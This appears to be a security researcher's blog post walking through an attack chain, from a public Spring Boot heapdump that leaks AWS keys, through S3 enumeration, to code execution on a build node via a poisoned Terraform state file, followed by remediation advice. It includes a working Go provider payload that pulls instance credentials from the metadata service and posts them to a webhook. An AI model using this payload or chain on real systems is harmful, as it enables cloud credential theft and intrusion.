+++
title = 'From Information Disclosure to RCE'
summmary = ''
date = 2024-09-02T11:22:33-04:00
draft = false
+++

## Introduction

Spring Boot[^1] is a popular Java web framework that allows developers to deploy production-grade applications with minimal effort. One of the features of this framework is something called "Spring Boot Actuators"[^2], which provide the application with a number of API endpoints that can be used to monitor and manage the application, including logging, metrics, environment variables, and more. However, many of these endpoints either expose sensitive information or even give potential attackers direct remote code execution and should never be exposed to the public. For this post, I am focusing on one specific endpoint: `/heapdump`, which returns an `hprof` Java heap dump file and may include sensitive information either in log data or in environment data[^3].

## Parsing HPROF files

There are a number of tools that can be used to parse `hprof` files, including MemoryAnalyzer[^4], pyhprof[^5], or hprof-slurp[^6]. MemoryAnalyzer often has issues with opening very large `hprof` files, and programatic parsers such as `pyhprof` or `hprof-slurp` seem to miss important data that may not be stored in the expected location. In order to find this important data, I would manually review the data to see if I could find a programatic way to find secrets without regard for following the hprof specification. This lead to finding data by "reading between the lines":

{{< figure src="/images/heapdump/manual_review.png" alt="A screenshot of part of a Java heap dump file in the hprof format when viewed in VIM" >}}

Without knowing what object of Java memory this data is stored in or what type it's classified as, we can see the first four characters of a long-term AWS access key: `AKIA`, separated by null characters. On the line above, we can see the word `southeast`, which confirms that this is likely a searchable pattern. Now, we could use this to search for specific key patterns across multiple files, but it's still fairly slow and we can't use tools like Trufflehog to validate the keys automatically. So let's write a quick script to strip out stuff we don't care about:

```python
import os
import re
import sys
import glob


def get_clean_name(fname):
    return f'parsed/{fname.split("/")[1]}.txt'


def read_in_chunks(file_object, chunk_size=1024):
    """Lazy function (generator) to read a file piece by piece.
    Default chunk size: 1k."""
    while True:
        data = file_object.read(chunk_size)
        if not data:
            break
        yield data


def clean(fname, data):
    clean_text = re.sub(b'[^a-zA-Z0-9 -~]', b'', data)
    with open(get_clean_name(fname), 'ab+') as f:
        f.write(clean_text)


for fname in glob.glob('heapdumps/*.hprof'):
    if os.path.isfile(get_clean_name(fname)):
        continue
    print(fname)
    data = None
    clean_text = None
    with open(fname, 'rb') as f:
        for d in read_in_chunks(f):
            clean(fname, d)
```

Sure this gets rid of a lot of other characters besides null bytes, but it should be good enough for what we're trying to do. The generator to read the data prevents the script from eating up all of the system memory, and it can be stopped and restarted at any time to continue where it left off. And now we can view the parsed output to see a clean AWS Access Key ID prefix and an AWS region name:

{{< figure src="/images/heapdump/heapdump_parsed.png" alt="A screenshot of part of the parsed version of a JAVA heap dump when viewed in VIM" >}}

Now we can use Trufflehog to dig for validated secrets:

```
$ trufflehog --no-update --only-verified filesystem parsed/heapfile.hprof.txt 
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2024-07-18T17:42:40-04:00	info-0	trufflehog	running source	{"source_manager_worker_id": "2Fl7X", "with_units": true}
✅ Found verified result 🐷🔑
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIA[snip]
Account: 1234567890
Rotation_guide: https://howtorotate.com/docs/tutorials/aws/
User_id: AIDA[snip]
Arn: arn:aws:iam::1234567890:user/s3-user
Resource_type: Access key
File: parsed/heapfile.hprof.txt
```

## Enumerating AWS S3

There are plenty of ways to escalate privileges in AWS, even with only S3 access, including any number of interesting data in the bucket itself. From here, classic file enumeration strategies can be used, with a focus on log files, scripts, and a unique vector that is more common in S3 than in a standard file system: Terraform state files[^7].

After digging through through the various S3 buckets in this account, the credentials appeared to have read-only access for anything that contained a Terraform state file. However, a handful of these buckets contained build artifacts and source code for various projects. Scanning these objects with Trufflehog identifies a new validated secret:

```
$ trufflehog --no-update --only-verified filesystem build-artifacts-bucket/
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2024-07-19T17:42:40-04:00	info-0	trufflehog	running source	{"source_manager_worker_id": "2Fl7X", "with_units": true}
✅ Found verified result 🐷🔑
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIA[snip]
Account: 0987654321
Rotation_guide: https://howtorotate.com/docs/tutorials/aws/
User_id: AIDA[snip]
Arn: arn:aws:iam::0987654321:user/s3-user-stg
Resource_type: Access key
File: build-artifacts-bucket/project-stg/config/config.ini
```

## Pivoting to another AWS Account

Finding credentials for a staging account in this scenario is good news. Staging and development accounts don't always have the same access controls and might have an unreported vulnerability. When looking through the S3 buckets in this account, we found what we were looking for: a Terraform state file that we could modify. Now all we need is the payload.

## Remote Code Execution

There is an excellent blog post on privilege escalation with Terraform state files[^8] that inspired this final step of the chain. This post uses a very basic example for RCE, but let's take this a step further. Typically in a business environment, Terraform code is run as part of a CI/CD workflow, such as Jenkins or GitLab[^9].

These workflows often use elevated permissions in order to deploy projects to any number of accounts. If we can get RCE on one of these build nodes, we can likely get credentials that give us near-administrator access to multiple accounts in the organization.

Based on vector described above, we will make a custom Terraform provider with the following content in the `New` method:

```go
func New(version string) func() provider.Provider {
	client := http.Client{Timeout: 3 * time.Second}

	// payload
    initPayload := map[string]string{
        "init": "1",
    }
    initJsonData, _ := json.Marshal(initPayload)

	// send init payload
	whReq, _ := http.NewRequest(http.MethodPost, "https://webhook.site/12345678-abcd-efgh-ijkl-9876abcd5432", bytes.NewBuffer(initJsonData))
    whReq.Header.Set("Content-Type", "application/json")
    whResp, _ := client.Do(whReq)
    defer whResp.Body.Close()

    // get hostname
    hostname, _ := os.Hostname()

    // get IMDS token
    tokenUrl := "http://169.254.169.254/latest/api/token"
    tokenReq, _ := http.NewRequest(http.MethodPut, tokenUrl, nil)
    tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
    tokenResp, _ := client.Do(tokenReq)
    defer tokenResp.Body.Close()
    tokenBody, _ := ioutil.ReadAll(tokenResp.Body)
    imdsToken := string(tokenBody)

    // get instance role
	baseCredsUrl := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
	baseCredsReq, _ := http.NewRequest(http.MethodGet, baseCredsUrl, nil)
    baseCredsReq.Header.Set("X-aws-ec2-metadata-token", imdsToken)
    baseCredsReq.Header.Set("Content-Type", "application/json")
	baseCredsResp, _ := client.Do(baseCredsReq)
    defer baseCredsResp.Body.Close()
	baseCredsBody, _ := ioutil.ReadAll(baseCredsResp.Body)
    roleName := string(baseCredsBody)

    // get credentials for role
	credsUrl := "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + roleName
	credsReq, _ := http.NewRequest(http.MethodGet, credsUrl, nil)
    credsReq.Header.Set("X-aws-ec2-metadata-token", imdsToken)
    credsReq.Header.Set("Content-Type", "application/json")
	credsResp, _ := client.Do(credsReq)
    defer credsResp.Body.Close()
	credsBody, _ := ioutil.ReadAll(credsResp.Body)
    credentials := string(credsBody)

	// generate payload
	finalPayload := map[string]string{
        "hostname": hostname,
        "roleName": roleName,
        "credentials": credentials,
    }
    finalJsonData, _ := json.Marshal(finalPayload)

    // send payload
	finalReq, _ := http.NewRequest(http.MethodPost, "https://webhook.site/12345678-abcd-efgh-ijkl-9876abcd5432", bytes.NewBuffer(finalJsonData))
    finalReq.Header.Set("Content-Type", "application/json")
	finalResp, _ := client.Do(finalReq)
    defer finalResp.Body.Close()

	return func() provider.Provider {
		return &ScaffoldingProvider{
			version: version,
		}
	}
}
```

This will let us know when the code is initially triggered from a `terraform plan` or `terraform apply` command, and then attempt to collect instance credentials and send them back to a webhook. These URLs can be for any system, and can connect to a workflow that automatically creates permanent credentials when the keys come in.

Now that we have the payload, we just need to add it to the state file. For this example, we have an empty state file without any resources. By adding a reference to the provider and nothing else, the `plan` and `apply` output should appear relatively harmless.

```
{
  "version": 4,
  "terraform_version": "0.15.5",
  "serial": 1,
  "lineage": "8981c36c-c7a7-9876-9955-233ab6041465",
  "outputs": {},
  "resources": [
    {
      "mode": "managed",
      "type": "scaffolding_example",
      "name": "example",
      "provider": "provider[\"registry.terraform.io/some-username/some-repo\"]",
      "instances": []
    }
  ]
}
```

Once run, we should see a hit to our webhook for the init, and if we're lucky, a second hit with credentials to a new role.

## Remediation

{{< figure src="/images/heapdump/workflow.png" alt="A diagram displaying the attack path" >}}

While this path involves some amount of complexity, there are a number of opportunities to practice "Defense in Depth" and limit much of the damage. Based on the diagram above, we can break down various segments of the attack.

### 1. Public SpringBoot Actuator `/heapdump`

The approach here is straightforward: many of the actuator endpoints should not be publically accessible. A firewall, WAF, application configuration, or webserver controls can all be used to limit access or disable the endpoints if not needed.

For more information, see the [SpringBoot documentation](https://docs.spring.io/spring-boot/docs/2.6.4/reference/htmlsingle/#actuator.endpoints.exposing).

### 2. Sensitive Information in `hprof`

If an attacker does get access to the heapdump file, the content can be made less sensitive. Instead of passing secrets in as environment variables, they can be stored in a secret store such as AWS SecretsManager[^10] or HashiCorp Vault[^11]. The application can then request the secrets as needed to connect to databases or other internal services.

When secrets are stored separately from the application using them, they become easier to rotate without requiring a re-deploy. Note that this approach may still result in secrets appearing in heapdumps if that endpoint is still available. However, it still helps to remove secrets from the application configuration in general.

In order to make requests to AWS services, the application should use temporary credentials using STS, and not long-lived access keys. These keys should have access only to the resources they need, such as a single S3 bucket specified in the `Resource` policy. If these keys are captured in memory, they will be significantly less useful with a fast expiry and limited access.

### 3. Readable Build Artifacts and Source Code

The storage system being used to manage build artifacts and source code should be restricted such that only the build system and authorized users and systems have access. Aside from containing possible secrets, this code can be used to review further weaknesses in live applications.

### 4. Sensitive information in Build Artifacts

Similar to using secrets in running applications, configuration files and other artifacts should not contain secrets where possible. If they are needed for the build process, such as for test jobs, they should be removed when the process is complete.

### 5. Writable Terraform State File

Terraform state files should never be writable by any application user or role outside of the build system. State locking and consistency checking via DynamoDB should be enabled[^12] and alerts should be triggered if any tampering outside of the build system has been detected.

### 6. Remote Code Execution on Build Node

The system responsible for building and deploying code should be isolated and locked down significantly. For example, buckets containing build artifacts and state files should be managed in a separate account along with the build system itself such that only said build system can access those resources.

Additionally, internal repositories should be created to allow the build system to require further security controls and audit capabilities[^13]. Many package managers also include tooling for auditing packages for that language, such as npm[^14] and Nuget[^15].

### 7. Access to Elevated Credentials

In AWS, you can use the service GuardDuty to trigger alerts when EC2 credentials are used outside of AWS[^15]. These kinds of alerts can be used to notify security teams when particular credentials are used in suspicious or anomalous ways.

Teams can also restrict credential access by requiring developers to specify least-privilege permissions needed for their specific deployment and requiring a security team to approve changes to these permissions.

## Final Notes

A significant number of security vulnerabilities in cloud environments involve either misconfiguration or access control issues. For CI/CD specifically, there are a number of resources available to secure your organization's pipelines, such as from OWASP[^17] and CISA[^18]. Preventing unauthorized access is a continous effort that should be shared by every team in an organization.

#### Resources

[^1]: [Spring Boot Documentation](https://spring.io/projects/spring-boot)
[^2]: [Spring Boot Actuator Service](https://spring.io/guides/gs/actuator-service)
[^3]: [Spring Boot Vulnerability Exploit Check List - 0x06：获取被星号脱敏的密码的明文 (方法四)](https://github.com/LandGrey/SpringBootVulExploit#0x06%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E5%9B%9B)
[^4]: [Eclipse MemoryAnalyzer](https://wiki.eclipse.org/MemoryAnalyzer/)
[^5]: [pyhprof](https://github.com/wdahlenburg/pyhprof)
[^6]: [hprof-slurp](https://lib.rs/crates/hprof-slurp)
[^7]: [Terraform State](https://developer.hashicorp.com/terraform/language/state)
[^8]: [Hacking Terraform State for Privilege Escalation](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
[^9]: [Building your infrastructure as code in GitLab](https://about.gitlab.com/topics/gitops/gitlab-enables-infrastructure-as-code/)
[^10]: [Get a Secrets Manager secret value using Java with client-side caching](https://docs.aws.amazon.com/secretsmanager/latest/userguide/retrieving-secrets_cache-java.html)
[^11]: [Encrypt Spring application data with Vault](https://developer.hashicorp.com/vault/tutorials/encryption-as-a-service/eaas-spring-demo)
[^12]: [Backend Type: S3 - DynamoDB Table Permissions](https://developer.hashicorp.com/terraform/language/settings/backends/s3#dynamodb-table-permissions)
[^13]: [What Is Dependency Chain Abuse?](https://www.paloaltonetworks.com/cyberpedia/dependency-chain-abuse-cicd-sec3)
[^14]: [Auditing package dependencies for security vulnerabilities](https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities)
[^15]: [Auditing package dependencies for security vulnerabilities](https://learn.microsoft.com/en-us/nuget/concepts/auditing-packages)
[^16]: [Amazon GuardDuty - UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationoutsideaws)
[^17]: [CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
[^18]: [Defending Continuous Integration/Continuous Delivery (CI/CD) Environments](https://media.defense.gov/2023/Jun/28/2003249466/-1/-1/0/CSI_DEFENDING_CI_CD_ENVIRONMENTS.PDF)